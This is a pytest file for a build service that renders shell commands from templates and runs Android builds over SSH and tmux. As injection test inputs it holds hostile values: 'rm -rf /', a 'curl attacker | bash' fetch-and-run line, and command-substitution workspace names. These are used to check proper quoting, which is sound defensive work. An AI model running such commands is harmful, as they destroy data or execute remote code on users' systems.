import asyncio
import json
import os
import shlex
import shutil
import subprocess
from pathlib import Path

import pytest
from starlette.requests import Request

from features.auth import CurrentUser
from features.build.executor import (
    BuildExecutionError,
    PreparedCommand,
    SshTmuxBuildBackend,
    build_command_from_template,
)
from features.build.repository import JOB_COLUMNS, BuildStore
from features.build.service import BuildService


def test_build_store_recovers_after_runtime_data_directory_deletion(tmp_path):
    data_dir = tmp_path / "build"
    store = BuildStore(data_dir / "build.sqlite3")

    shutil.rmtree(data_dir)

    assert store.list_jobs(limit=20) == []


def test_build_command_renders_workspace_init_and_command():
    server = {"workspace_root": "/home/hcq"}
    template = {
        "workspace": "{workspace}",
        "init_commands": ["source build/envsetup.sh", "lunch {lunch_target}"],
        "command": "{build_command}",
        "parameters_schema": {
            "workspace": {"required": True},
            "lunch_target": {"required": True},
            "build_command": {
                "default": "./build.sh -J 8",
                "validation": "trusted_shell_fragment",
                # fullmatch 语义：需覆盖整个命令片段。
                "pattern": r"\./build\.sh [A-Za-z0-9 ._/-]*",
            },
        },
    }

    prepared = build_command_from_template(
        template,
        server,
        {
            "workspace": "/home/hcq/rk/android",
            "lunch_target": "rk3566_rgo-userdebug",
        },
    )

    assert prepared.workspace == "/home/hcq/rk/android"
    assert prepared.init_commands[-1] == "lunch rk3566_rgo-userdebug"
    assert prepared.command == "./build.sh -J 8"


def test_standard_parameters_are_shell_quoted_by_default():
    """含空格的普通参数被 quote，不能改变参数边界或注入元字符。"""
    server = {"workspace_root": "/srv"}
    template = {
        "workspace": "{workspace}",
        "command": "./build.sh --product {product}",
        "parameters_schema": {
            "workspace": {"required": True},
            "product": {"required": True},
        },
    }

    prepared = build_command_from_template(
        template,
        server,
        {"workspace": "/srv/build", "product": "rk3588 userdebug; rm -rf /"},
    )

    assert prepared.command == "./build.sh --product 'rk3588 userdebug; rm -rf /'"


def test_path_parameters_are_quoted_in_shell_context_but_raw_in_path_context():
    """type=path 双上下文:路径上下文保持裸值供拼接,shell 上下文必须 quote。

    模板把 {output_path} 写进 command 时,"/tmp/a; curl attacker | bash"
    不得以元字符裸进 bash -lc / shell=True。
    """
    server = {"workspace_root": "/srv"}
    template = {
        "workspace": "{workspace}",
        "command": "cp update.img {output_path}",
        "init_commands": ["echo packing {output_path}"],
        "parameters_schema": {
            "workspace": {"required": True},
            "output_path": {"type": "path", "required": True},
        },
    }

    prepared = build_command_from_template(
        template,
        server,
        {
            "workspace": "/srv/build",
            "output_path": "/tmp/a; curl attacker | bash",
        },
    )

    assert prepared.command == "cp update.img '/tmp/a; curl attacker | bash'"
    assert prepared.init_commands == ["echo packing '/tmp/a; curl attacker | bash'"]
    # 路径上下文(workspace 拼接/归一化)不受 quote 影响。
    assert prepared.workspace == "/srv/build"


def test_workspace_placeholder_in_command_is_shell_quoted():
    """workspace 参数出现在 command 里时同样按 shell 上下文 quote。"""
    server = {"workspace_root": "/srv"}
    template = {
        "workspace": "{workspace}",
        "command": "cd {workspace} && ./build.sh",
        "parameters_schema": {
            "workspace": {"required": True},
        },
    }

    prepared = build_command_from_template(
        template,
        server,
        {"workspace": "/srv/my build; rm -rf x"},
    )

    assert prepared.workspace == "/srv/my build; rm -rf x"
    assert prepared.command == "cd '/srv/my build; rm -rf x' && ./build.sh"


def test_trusted_shell_fragment_requires_pattern_or_choices():
    """显式声明裸插入片段时必须同时提供 pattern/choices 白名单。"""
    server = {"workspace_root": "/srv"}
    template = {
        "workspace": "/srv/build",
        "command": "{build_command}",
        "parameters_schema": {
            "build_command": {"validation": "trusted_shell_fragment"},
        },
    }

    with pytest.raises(BuildExecutionError, match="trusted_shell_fragment requires"):
        build_command_from_template(template, server, {"build_command": "evil"})


def test_build_command_rejects_workspace_escape():
    with pytest.raises(BuildExecutionError):
        build_command_from_template(
            {
                "workspace": "/tmp/other",
                "command": "true",
                "parameters_schema": {},
            },
            {"workspace_root": "/home/hcq"},
            {},
        )


def test_build_command_rejects_parent_segment_workspace_escape():
    for workspace in ('/srv/build/../secrets', '../secrets'):
        with pytest.raises(BuildExecutionError, match='workspace escapes'):
            build_command_from_template(
                {
                    'workspace': workspace,
                    'command': 'true',
                },
                {'workspace_root': '/srv/build'},
                {},
            )


HOSTILE_WORKSPACES = [
    # Command substitution must never expand in ANY outer shell layer of
    # the generated tmux command (nested-quote injection regression).
    'foo$(touch PWN_SUBSTITUTION)',
    'foo`touch PWN_BACKTICK`',
    'foo; touch PWN_SEMICOLON',
    "foo'touch PWN_QUOTE",
    'foo"touch PWN_DQUOTE',
    'foo bar',
    'foo PWN_SPACE touch',
]


@pytest.mark.parametrize('workspace_name', HOSTILE_WORKSPACES)
def test_remote_start_command_never_expands_hostile_workspace(
    tmp_path: Path, workspace_name: str
):
    """The full remote command must survive a real shell without executing
    anything embedded in the workspace name, and tmux must receive the
    bash -lc command as ONE argv element (never re-parsed by outer shells)."""
    stub_bin = tmp_path / 'stub-bin'
    stub_bin.mkdir()
    tmux_log = tmp_path / 'tmux-args.log'
    (stub_bin / 'tmux').write_text(
        '#!/bin/sh\nprintf \'%s\\t\' "$@" >> '
        + shlex.quote(str(tmux_log))
        + '\nprintf \'\\n\' >> '
        + shlex.quote(str(tmux_log))
        + '\nexit 0\n'
    )
    (stub_bin / 'tmux').chmod(0o755)

    workspace_root = tmp_path / 'srv' / 'android'
    workspace = workspace_root / workspace_name
    workspace.mkdir(parents=True, exist_ok=True)

    backend = SshTmuxBuildBackend()

    def execute(server, command, timeout=30):
        # Execute the generated remote command through a REAL shell, from a
        # controlled cwd, with the stub tmux first on PATH. If any quoting
        # layer leaked, $(...)/`...`/; would create a PWN_* file here.
        proc = subprocess.run(
            command,
            shell=True,
            cwd=str(tmp_path),
            capture_output=True,
            text=True,
            timeout=timeout,
            env={**os.environ, 'PATH': f'{stub_bin}{os.pathsep}{os.environ["PATH"]}'},
        )
        return proc.returncode, proc.stdout, proc.stderr

    backend._run = execute
    prepared = PreparedCommand(
        command='true',
        workspace=str(workspace),
        artifact_patterns=[],
        init_commands=[],
    )
    result = backend.start(
        server={},
        job_id='job1',
        prepared=prepared,
        init_commands=[],
        timeout_sec=60,
    )

    assert result['session'] == 'gms_build_job1'
    pwn_files = sorted(p.name for p in tmp_path.glob('PWN*'))
    assert pwn_files == [], f'command substitution leaked: {pwn_files}'

    invocations = [
        line.rstrip('\t').split('\t')
        for line in tmux_log.read_text().splitlines()
    ]
    assert invocations, 'stub tmux was never invoked'
    # First invocation: kill-session (harmless). Last: new-session.
    last = invocations[-1]
    assert last[0] == 'new-session'
    assert last[1] == '-d'
    assert last[2] == '-s'
    assert last[3] == 'gms_build_job1'
    # The whole `bash -lc ...` command must arrive as ONE argument: if it
    # were ever split, an outer shell had re-parsed it (injection vector).
    assert len(last) == 5, last
    parsed = shlex.split(last[4])
    assert parsed[:2] == ['bash', '-lc'], parsed
    assert len(parsed) == 3, parsed
    inner_command = parsed[2]
    assert inner_command.startswith('timeout 60s ')
    # Unquoting must restore the workspace verbatim — proof the hostile
    # characters stayed literal through every shell layer.
    inner_tokens = shlex.split(inner_command)
    assert any(
        str(workspace) in token for token in inner_tokens
    ), inner_tokens



def test_env_password_auth_requires_configured_environment(monkeypatch):
    monkeypatch.delenv("TEST_BUILD_PASSWORD", raising=False)
    backend = SshTmuxBuildBackend()

    with pytest.raises(BuildExecutionError, match="TEST_BUILD_PASSWORD"):
        backend._connect_kwargs({
            "host": "build-server",
            "username": "builder",
            "auth": {"type": "env_password", "env": "TEST_BUILD_PASSWORD"},
        })


def test_env_password_auth_never_falls_back_to_local_keys(monkeypatch):
    monkeypatch.setenv("TEST_BUILD_PASSWORD", "secret")
    backend = SshTmuxBuildBackend()

    kwargs = backend._connect_kwargs({
        "host": "build-server",
        "username": "builder",
        "auth": {"type": "env_password", "env": "TEST_BUILD_PASSWORD"},
    })

    assert kwargs["password"] == "secret"
    assert kwargs["look_for_keys"] is False
    assert kwargs["allow_agent"] is False


def test_artifact_discovery_searches_only_static_pattern_prefixes():
    backend = SshTmuxBuildBackend()
    commands = []

    def fake_run(_server, command, timeout=30):
        commands.append((command, timeout))
        return 0, "", ""

    backend._run = fake_run
    backend.discover_artifacts(
        server={},
        workspace="/home/hcq/android",
        patterns=["rockdev/Image-*/update.img", "out/target/product/*/*.img"],
    )

    command, timeout = commands[0]
    assert "find /home/hcq/android/rockdev -maxdepth 2" in command
    assert "find /home/hcq/android/out/target/product -maxdepth 2" in command
    assert "find /home/hcq/android -path" not in command
    assert timeout == 60


def test_poll_api_returns_service_unavailable_for_build_connection_error(monkeypatch):
    from features.build import api as build_api

    class UnavailableBuildService:
        @staticmethod
        def get_job(_job_id):
            return {"id": "build_demo", "owner": "id-alice"}

        @staticmethod
        def poll_job(_job_id):
            raise BuildExecutionError("构建服务器暂不可用")

    monkeypatch.setattr(build_api, "build_service", UnavailableBuildService())
    request = Request({"type": "http", "headers": []})
    request.state.current_user = CurrentUser(
        id="id-alice", username="alice", role="user"
    )
    response = asyncio.run(build_api.get_build_job("build_demo", request, poll=True))

    assert response.status_code == 503
    assert json.loads(response.body)["error"] == "构建服务器暂不可用"


def test_parse_lunch_options_from_rkbuild_output():
    output = """
You're building on Linux
Lunch menu... pick a combo:
  1. rk3566_rgo-userdebug
  2) rk3588-userdebug
  - rk3576_s-user
Which would you like? [Default 1]
TARGET_PRODUCT=rk3566_rgo TARGET_BUILD_VARIANT=userdebug
-------------------------------------------
rk3326-evb-lp3-v11-avb
"""

    assert BuildService._parse_lunch_options(output) == [
        "rk3566_rgo-userdebug",
        "rk3588-userdebug",
        "rk3576_s-user",
    ]


def test_parse_scoped_lunch_options_ignores_shell_noise():
    output = """profile noise rk3326-userdebug
__GMS_LUNCH_BEGIN__
pk30_u-bp2a-user
pk30_u-bp2a-userdebug
__GMS_LUNCH_END__
post noise rk3588-userdebug
"""
    assert BuildService._parse_scoped_lunch_options(output) == [
        "pk30_u-bp2a-user",
        "pk30_u-bp2a-userdebug",
    ]


def test_discover_lunch_options_prefers_rkbuild_menu(tmp_path: Path):
    config_path = tmp_path / "build_servers.json"
    config_path.write_text(
        json.dumps({
            "servers": [{
                "id": "local",
                "backend": "local",
                "workspace_root": str(tmp_path),
            }],
            "templates": [],
        }),
        encoding="utf-8",
    )
    service = BuildService(
        store=BuildStore(tmp_path / "build.sqlite3"),
        config_path=config_path,
    )

    class RkbuildBackend:
        calls = 0

        def _run(self, _server, command, timeout=30):
            self.calls += 1
            if self.calls == 1:
                assert "device/rockchip" in command
                assert timeout == 15
                return 0, """__GMS_LUNCH_BEGIN__
__GMS_LUNCH_END__
""", ""
            assert "rkbuild_lunch" in command
            assert timeout == 45
            return 0, """__GMS_LUNCH_BEGIN__
Lunch menu... pick a combo:
  1. rk3576_u-userdebug
  2. rk3576_u-user
Which would you like? [Default 1]
TARGET_PRODUCT=rk3576_u
__GMS_LUNCH_END__
""", ""

    backend = RkbuildBackend()
    service.backends["local"] = backend

    assert service.discover_lunch_options("local", str(tmp_path)) == [
        "rk3576_u-userdebug",
        "rk3576_u-user",
    ]
    assert backend.calls == 2


def test_discover_lunch_options_uses_rockchip_products_and_cache(tmp_path: Path):
    config_path = tmp_path / "build_servers.json"
    config_path.write_text(
        json.dumps({
            "servers": [{
                "id": "local",
                "backend": "local",
                "workspace_root": str(tmp_path),
            }],
            "templates": [],
        }),
        encoding="utf-8",
    )
    service = BuildService(
        store=BuildStore(tmp_path / "build.sqlite3"),
        config_path=config_path,
    )

    class RockchipBackend:
        calls = 0

        def _run(self, _server, command, timeout=30):
            self.calls += 1
            assert "device/rockchip" in command
            assert "rkbuild_lunch" not in command
            return 0, """__GMS_LUNCH_BEGIN__
rk3576_u-user
rk3576_u-userdebug
__GMS_LUNCH_END__
""", ""

    backend = RockchipBackend()
    service.backends["local"] = backend

    expected = ["rk3576_u-user", "rk3576_u-userdebug"]
    assert service.discover_lunch_options("local", str(tmp_path)) == expected
    assert service.discover_lunch_options("local", str(tmp_path)) == expected
    assert backend.calls == 1
    assert service.discover_lunch_options(
        "local", str(tmp_path), force_refresh=True
    ) == expected
    assert backend.calls == 2


def test_delete_build_history_only_allows_terminal_jobs(tmp_path: Path):
    store = BuildStore(tmp_path / "build.sqlite3")
    config_path = tmp_path / "build_servers.json"
    config_path.write_text('{"servers": [], "templates": []}', encoding="utf-8")
    service = BuildService(store=store, config_path=config_path)
    base = {column: "" for column in JOB_COLUMNS}
    base.update({"id": "done", "server_id": "s", "template_id": "t", "status": "completed"})
    store.create_job(base)
    running = dict(base, id="running", status="running")
    store.create_job(running)

    service.delete_job("done")
    assert store.get_job("done") is None
    with pytest.raises(BuildExecutionError, match="只能删除"):
        service.delete_job("running")


